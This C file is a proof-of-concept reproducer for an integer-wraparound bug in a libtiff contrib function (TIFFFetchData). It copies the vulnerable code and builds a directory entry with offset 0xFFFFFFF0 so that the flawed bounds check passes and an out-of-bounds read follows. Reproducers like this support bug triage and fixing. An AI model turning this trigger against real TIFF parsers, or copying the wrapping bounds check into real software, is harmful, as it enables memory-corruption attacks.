#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

/* Minimal typedefs to mirror the vulnerable code */
typedef uint32_t tsize_t; /* ensure 32-bit arithmetic for cc and addition */

typedef struct {
    const char *tif_name;
    uint32_t tif_flags;
    size_t tif_size;           /* mapped buffer size */
    unsigned char *tif_base;   /* mapped buffer base */
} TIFF;

typedef struct {
    uint16_t tdir_tag;
    uint16_t tdir_type;
    uint32_t tdir_count;
    uint32_t tdir_offset;      /* 32-bit offset causing wrap */
} TIFFDirEntry;

/* Constants and helpers to mirror libtiff expectations */
#define TIFF_MAPPED 0x0001
#define TIFF_SWAB   0x0002

static int isMapped(TIFF *tif) { return (tif->tif_flags & TIFF_MAPPED) != 0; }

/* TIFF data types (subset) */
#define TIFF_BYTE      1
#define TIFF_ASCII     2
#define TIFF_SHORT     3
#define TIFF_LONG      4
#define TIFF_RATIONAL  5
#define TIFF_SSHORT    8
#define TIFF_SLONG     9
#define TIFF_SRATIONAL 10
#define TIFF_FLOAT     11
#define TIFF_DOUBLE    12

/* Stubs required by the vulnerable function, kept static to avoid symbol clashes with -ltiff */
static int TIFFDataWidth(uint16_t type)
{
    switch (type) {
        case TIFF_BYTE: return 1;
        case TIFF_ASCII: return 1;
        case TIFF_SHORT: return 2;
        case TIFF_SSHORT: return 2;
        case TIFF_LONG: return 4;
        case TIFF_SLONG: return 4;
        case TIFF_RATIONAL: return 8;
        case TIFF_SRATIONAL: return 8;
        case TIFF_FLOAT: return 4;
        case TIFF_DOUBLE: return 8;
        default: return 1;
    }
}

static void _TIFFmemcpy(void *dst, const void *src, tsize_t n) { memcpy(dst, src, (size_t)n); }

/* These are only used on other branches or on error; provide harmless stubs */
static int SeekOK(TIFF *tif, uint32_t off) { (void)tif; (void)off; return 0; }
static int ReadOK(TIFF *tif, void *buf, tsize_t n) { (void)tif; (void)buf; (void)n; return 0; }
static void TIFFWarning(const char *name, const char *fmt, ...) { (void)name; (void)fmt; }
static void TIFFErrorExtR(TIFF *tif, const char *module, const char *fmt, ...) { (void)tif; (void)module; (void)fmt; }

typedef struct { const char *field_name; } TIFFField;
static TIFFField gfield = { "DummyField" };
static TIFFField* _TIFFFieldWithTag(TIFF *tif, uint16_t tag) { (void)tif; (void)tag; return &gfield; }

static void TIFFSwabArrayOfShort(uint16_t *v, uint32_t n) { (void)v; (void)n; }
static void TIFFSwabArrayOfLong(uint32_t *v, uint32_t n) { (void)v; (void)n; }
static void TIFFSwabArrayOfDouble(double *v, uint32_t n) { (void)v; (void)n; }

/* Vulnerable function reproduced from contrib/pds/tif_pdsdirread.c */
static tsize_t TIFFFetchData(TIFF *tif, TIFFDirEntry *dir, char *cp)
{
    int w = TIFFDataWidth(dir->tdir_type);
    tsize_t cc = dir->tdir_count * w;  /* cc is 32-bit */

    if (!isMapped(tif))
    {
        if (!SeekOK(tif, dir->tdir_offset))
            goto bad;
        if (!ReadOK(tif, cp, cc))
            goto bad;
    }
    else
    {
        /* BUG: 32-bit unsigned wrap in (uint32_t + tsize_t) */
        if (dir->tdir_offset + cc > tif->tif_size)
            goto bad;
        _TIFFmemcpy(cp, tif->tif_base + dir->tdir_offset, cc);
    }
    if (tif->tif_flags & TIFF_SWAB)
    {
        switch (dir->tdir_type)
        {
            case TIFF_SHORT:
            case TIFF_SSHORT:
                TIFFSwabArrayOfShort((uint16_t *)cp, dir->tdir_count);
                break;
            case TIFF_LONG:
            case TIFF_SLONG:
            case TIFF_FLOAT:
                TIFFSwabArrayOfLong((uint32_t *)cp, dir->tdir_count);
                break;
            case TIFF_RATIONAL:
            case TIFF_SRATIONAL:
                TIFFSwabArrayOfLong((uint32_t *)cp, 2 * dir->tdir_count);
                break;
            case TIFF_DOUBLE:
                TIFFSwabArrayOfDouble((double *)cp, dir->tdir_count);
                break;
        }
    }
    return (cc);
 bad:
    TIFFErrorExtR(tif, tif->tif_name, "Error fetching data for field \"%s\"",
                  _TIFFFieldWithTag(tif, dir->tdir_tag)->field_name);
    return (tsize_t)0;
}

int main(void)
{
    /* Allocate a small "mmap"-like buffer */
    size_t mapped_size = 1024;
    unsigned char *base = (unsigned char *)malloc(mapped_size);
    if (!base) {
        fprintf(stderr, "alloc fail\n");
        return 1;
    }
    memset(base, 0xAA, mapped_size);

    TIFF tif;
    tif.tif_name = "repro.tif";
    tif.tif_flags = TIFF_MAPPED; /* force isMapped(tif) == true */
    tif.tif_size = mapped_size;  /* size of mapped buffer */
    tif.tif_base = base;         /* base of mapped buffer */

    /* Craft a directory entry so that (offset + cc) wraps in 32-bit */
    TIFFDirEntry dir;
    dir.tdir_tag = 0x0100;           /* arbitrary */
    dir.tdir_type = TIFF_BYTE;       /* width = 1 */
    dir.tdir_count = 64;             /* cc = 64 */
    dir.tdir_offset = 0xFFFFFFF0u;   /* near 2^32, so 0xFFFFFFF0 + 64 = 0x30 (wrap) */

    char outbuf[64];

    fprintf(stderr, "About to trigger out-of-bounds read via wrapped bounds check...\n");
    /* This call should pass the flawed bounds check and attempt to memcpy
       from base + 0xFFFFFFF0, which is far beyond the allocated mapping. */
    (void)TIFFFetchData(&tif, &dir, outbuf);

    /* If we somehow survive, print something */
    fprintf(stderr, "Done (unexpected).\n");

    free(base);
    return 0;
}